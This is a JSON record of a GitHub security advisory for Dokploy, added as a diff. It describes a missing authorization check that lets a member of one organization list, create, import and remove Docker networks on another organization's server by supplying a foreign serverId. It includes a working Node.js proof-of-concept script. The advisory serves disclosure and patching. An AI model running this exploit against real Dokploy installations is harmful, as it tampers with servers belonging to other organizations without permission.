@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-3qp9-jw8g-424v",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "description": "### Summary\r\n\r\nA logged in member can make Dokploy run Docker network actions on a server owned by another organization.\r\n\r\nThe network routes accept a `serverId` from the request, but do not check that the server belongs to the active organization. A member who knows a foreign `serverId` can list networks, create a network, import a network, inspect it, and remove an unused network.\r\n\r\nSeverity is medium when the foreign server id must be guessed, and high when server ids are exposed.\r\n\r\n### Details\r\n\r\nIn `apps/dokploy/server/api/routers/network.ts`, the network routes accept a caller supplied `serverId` and use only `protectedProcedure`:\r\n\r\n```ts\r\ncreate: protectedProcedure\r\n\t.input(apiCreateNetwork)\r\n\t.mutation(async ({ ctx, input }) => {\r\n\t\treturn createNetwork(input, ctx.session.activeOrganizationId);\r\n\t}),\r\n```\r\n\r\nIn `packages/server/src/services/network.ts`, that server id is used for the Docker connection:\r\n\r\n```ts\r\nconst docker = await getRemoteDocker(serverId);\r\nawait docker.createNetwork({ Name: row.name, Driver: row.driver });\r\n```\r\n\r\n`getRemoteDocker` looks up the server by id only. It does not check that the server belongs to the active organization. The same missing check affects network listing and import.\r\n\r\n### PoC\r\n\r\nI tested this on Dokploy `v0.30.0`.\r\n\r\nLog in as a member of organization A, get a `serverId` from organization B, replace the values below, and run this with Node 18 or later.\r\n\r\n```js\r\n(async () => {\r\n\tconst HOST = \"http://localhost:3000\";\r\n\tconst session = \"BETTER_AUTH_SESSION_TOKEN\";\r\n\tconst serverId = \"SERVER_ID_FROM_ORG_B\";\r\n\tconst name = `pocnetwork${Date.now()}`;\r\n\tconst headers = {\r\n\t\t\"Content-Type\": \"application/json\",\r\n\t\tCookie: `better-auth.session_token=${session}`,\r\n\t};\r\n\r\n\tconst createResponse = await fetch(`${HOST}/api/trpc/network.create`, {\r\n\t\tmethod: \"POST\",\r\n\t\theaders,\r\n\t\tbody: JSON.stringify({ json: { name, serverId } }),\r\n\t});\r\n\tif (!createResponse.ok) {\r\n\t\tthrow new Error(await createResponse.text());\r\n\t}\r\n\r\n\tconst created = await createResponse.json();\r\n\tconsole.log(created);\r\n\r\n\tconst networkId = created.result.data.json.networkId;\r\n\tawait fetch(`${HOST}/api/trpc/network.remove`, {\r\n\t\tmethod: \"POST\",\r\n\t\theaders,\r\n\t\tbody: JSON.stringify({ json: { networkId } }),\r\n\t});\r\n})().catch(console.error);\r\n```\r\n\r\nThe create response contains the new network row. The Docker network is created on organization B's server, then the second request removes the test network.\r\n\r\n### Impact\r\n\r\nThis is an authorization bug.\r\n\r\nAny logged in member who knows a server id from another organization can cause Docker network changes on that server. This can expose network names and settings, add a network to the host, or remove an unused network.\r\n\r\nThe main affected parties are organizations that share a Dokploy installation and use separate servers or remote Docker hosts.",
+    "ghsa_id": "GHSA-3qp9-jw8g-424v",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-3qp9-jw8g-424v",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-3qp9-jw8g-424v"
+      }
+    ],
+    "published_at": "2026-11-12T08:16:05Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Cross-organization Docker network control through unchecked `serverId`",
+    "updated_at": "2026-11-12T08:16:05Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
